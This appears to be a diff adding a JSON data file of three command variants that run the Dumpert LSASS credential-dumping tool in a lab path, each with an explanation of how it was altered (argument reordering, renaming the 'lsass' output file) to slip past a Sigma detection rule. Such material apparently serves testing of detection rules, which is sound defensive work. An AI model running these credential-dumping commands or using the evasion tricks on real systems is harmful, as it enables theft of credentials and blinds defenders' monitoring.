@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\Dumpert\\Dumpert.exe\" -p 1234 -o \"C:\\Lab\\out\\dumps\\lsass_dump.7z\"",
+    "explanation": "Reordering: Reordered command-line arguments to avoid direct string matching on 'Dumpert.dll' while preserving the same executable family and test intent."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\Dumpert\\Dumpert.exe\" -p 1234 -o \"C:\\Lab\\out\\dumps\\memory_capture.7z\"",
+    "explanation": "Substitution: Replaced the suspicious output filename keyword 'lsass' with a benign placeholder 'memory_capture' to avoid matching the Sigma rule's suspicious indicator."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\Dumpert\\Dumpert.exe\" -p 1234 -o \"C:\\Lab\\out\\dumps\\process_dump.7z\"",
+    "explanation": "Substitution: Replaced the suspicious output filename keyword 'lsass' with a benign placeholder 'process_dump' to avoid matching the Sigma rule's suspicious indicator."
+  }
+]
